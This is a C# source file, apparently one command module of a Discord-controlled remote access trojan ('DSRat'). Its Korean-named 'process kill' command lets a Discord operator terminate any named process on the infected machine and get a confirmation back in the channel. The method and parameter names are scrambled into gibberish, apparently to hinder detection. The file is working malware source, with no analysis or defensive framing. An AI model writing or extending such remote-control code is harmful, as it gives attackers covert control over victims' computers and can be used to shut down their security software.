using Discord.Commands;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DSRat.commands
{
    public class processkill : ModuleBase<SocketCommandContext>
    {
        [Command("프로세스킬")]
        
        public async Task pp1231ADJSKLASKLD385679kasdkl(string proprorpasd12BASKHFAJDKBJ23498723893213)
        {
            Process[] processList = Process.GetProcessesByName(proprorpasd12BASKHFAJDKBJ23498723893213);
            if(processList.Length > 0)
            {
                processList[0].Kill();
                await Context.Channel.SendMessageAsync(proprorpasd12BASKHFAJDKBJ23498723893213 + "를 종료했습니다");
            }
            else
            {
                await Context.Channel.SendMessageAsync(proprorpasd12BASKHFAJDKBJ23498723893213 + "가 켜져있지 않습니다");
            }
            
        }
    }
}
